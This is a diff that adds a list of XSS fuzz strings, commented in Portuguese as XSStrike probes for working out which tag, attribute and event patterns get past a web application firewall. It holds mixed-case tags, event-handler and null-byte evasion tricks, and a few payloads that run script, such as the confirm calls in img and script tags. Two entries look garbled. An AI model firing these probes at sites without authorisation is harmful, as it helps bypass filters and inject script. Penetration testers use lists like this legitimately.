@@ -1,0 +1,23 @@
+# XSStrike Fuzz Strings — para testar quais padrões passam pelo WAF
+# Cada string testa uma combinação específica de chars/tags/eventos
+# Se refletida = WAF não bloqueia esse padrão
+<test
+<test//
+<test>
+<test x>
+<test x=y//
+<test/oNxX=yYy//
+<test onload=x
+<test/o%00telefonload=x
+<svg x=y>
+<details x=y//
+<a href=x>
+<emBed x=y>
+<object x=y//
+<bGsOund sRc=x>
+<iSinDEx workaroundAction=x>
+<audIo x=y>
+<Details Open oNToggle=x>
+"-confirm``-"
+<img sRc=x:confirm``>
+<sCript x>confirm``</sCript>
